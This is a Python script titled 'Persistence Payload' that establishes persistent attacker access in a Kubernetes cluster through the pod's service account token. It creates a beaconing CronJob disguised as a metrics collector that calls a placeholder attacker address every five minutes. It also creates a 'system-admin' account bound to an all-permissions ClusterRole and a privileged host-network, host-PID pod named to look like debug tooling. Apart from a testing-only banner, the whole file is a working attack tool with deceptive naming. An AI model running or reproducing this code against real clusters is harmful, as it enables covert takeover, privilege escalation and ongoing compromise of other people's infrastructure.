#!/usr/bin/env python3
"""
Persistence Payload
⚠️ AUTHORIZED TESTING ONLY

This payload establishes persistent access using Kubernetes API.
Requires service account with appropriate permissions.
"""

import os
import ssl
import json
import urllib.request

K8S_API = "https://kubernetes.default.svc"
TOKEN_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/token"
CA_PATH = "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"

# Configuration - MODIFY BEFORE USE
ATTACKER_URL = "http://REPLACE_WITH_ATTACKER_IP:8888"
BEACON_INTERVAL = "*/5 * * * *"  # Every 5 minutes


def get_k8s_client():
    """Get Kubernetes API client configuration"""
    with open(TOKEN_PATH, 'r') as f:
        token = f.read().strip()
    
    ssl_context = ssl.create_default_context()
    ssl_context.load_verify_locations(CA_PATH)
    
    return token, ssl_context


def k8s_api_call(method, url, token, ssl_context, data=None):
    """Make Kubernetes API call"""
    req = urllib.request.Request(
        url,
        data=json.dumps(data).encode('utf-8') if data else None,
        method=method,
        headers={
            'Authorization': f'Bearer {token}',
            'Content-Type': 'application/json'
        }
    )
    
    with urllib.request.urlopen(req, context=ssl_context) as response:
        return json.loads(response.read())


def create_beacon_cronjob(namespace="default"):
    """Create a CronJob that beacons back to attacker"""
    token, ssl_ctx = get_k8s_client()
    
    cronjob = {
        "apiVersion": "batch/v1",
        "kind": "CronJob",
        "metadata": {
            "name": "system-metrics-collector",
            "namespace": namespace,
            "labels": {
                "app.kubernetes.io/component": "metrics"
            }
        },
        "spec": {
            "schedule": BEACON_INTERVAL,
            "successfulJobsHistoryLimit": 1,
            "failedJobsHistoryLimit": 1,
            "jobTemplate": {
                "spec": {
                    "template": {
                        "spec": {
                            "containers": [{
                                "name": "collector",
                                "image": "curlimages/curl:latest",
                                "command": ["/bin/sh", "-c"],
                                "args": [
                                    f"curl -s {ATTACKER_URL}/beacon?h=$(hostname)&t=$(date +%s)"
                                ]
                            }],
                            "restartPolicy": "Never"
                        }
                    }
                }
            }
        }
    }
    
    url = f"{K8S_API}/apis/batch/v1/namespaces/{namespace}/cronjobs"
    return k8s_api_call('POST', url, token, ssl_ctx, cronjob)


def create_backdoor_sa(namespace="default"):
    """Create a service account with elevated privileges"""
    token, ssl_ctx = get_k8s_client()
    
    # Create ServiceAccount
    sa = {
        "apiVersion": "v1",
        "kind": "ServiceAccount",
        "metadata": {
            "name": "system-admin",
            "namespace": namespace
        }
    }
    
    sa_url = f"{K8S_API}/api/v1/namespaces/{namespace}/serviceaccounts"
    try:
        k8s_api_call('POST', sa_url, token, ssl_ctx, sa)
    except:
        pass  # May already exist
    
    # Create ClusterRole
    role = {
        "apiVersion": "rbac.authorization.k8s.io/v1",
        "kind": "ClusterRole",
        "metadata": {"name": "system-admin-role"},
        "rules": [{
            "apiGroups": ["*"],
            "resources": ["*"],
            "verbs": ["*"]
        }]
    }
    
    role_url = f"{K8S_API}/apis/rbac.authorization.k8s.io/v1/clusterroles"
    try:
        k8s_api_call('POST', role_url, token, ssl_ctx, role)
    except:
        pass
    
    # Create ClusterRoleBinding
    binding = {
        "apiVersion": "rbac.authorization.k8s.io/v1",
        "kind": "ClusterRoleBinding",
        "metadata": {"name": "system-admin-binding"},
        "roleRef": {
            "apiGroup": "rbac.authorization.k8s.io",
            "kind": "ClusterRole",
            "name": "system-admin-role"
        },
        "subjects": [{
            "kind": "ServiceAccount",
            "name": "system-admin",
            "namespace": namespace
        }]
    }
    
    binding_url = f"{K8S_API}/apis/rbac.authorization.k8s.io/v1/clusterrolebindings"
    return k8s_api_call('POST', binding_url, token, ssl_ctx, binding)


def create_web_shell_pod(namespace="default"):
    """Create a pod with interactive web shell"""
    token, ssl_ctx = get_k8s_client()
    
    pod = {
        "apiVersion": "v1",
        "kind": "Pod",
        "metadata": {
            "name": "debug-tools",
            "namespace": namespace,
            "labels": {"app": "debug"}
        },
        "spec": {
            "containers": [{
                "name": "shell",
                "image": "alpine:latest",
                "command": ["/bin/sh", "-c"],
                "args": ["while true; do sleep 3600; done"],
                "securityContext": {
                    "privileged": True
                }
            }],
            "hostNetwork": True,
            "hostPID": True,
            "serviceAccountName": "system-admin"
        }
    }
    
    url = f"{K8S_API}/api/v1/namespaces/{namespace}/pods"
    return k8s_api_call('POST', url, token, ssl_ctx, pod)


def establish_persistence():
    """Run all persistence mechanisms"""
    results = {}
    
    try:
        results['cronjob'] = create_beacon_cronjob()
    except Exception as e:
        results['cronjob_error'] = str(e)
    
    try:
        results['backdoor_sa'] = create_backdoor_sa()
    except Exception as e:
        results['backdoor_sa_error'] = str(e)
    
    try:
        results['web_shell'] = create_web_shell_pod()
    except Exception as e:
        results['web_shell_error'] = str(e)
    
    return results


if __name__ == "__main__":
    print(json.dumps(establish_persistence(), indent=2))
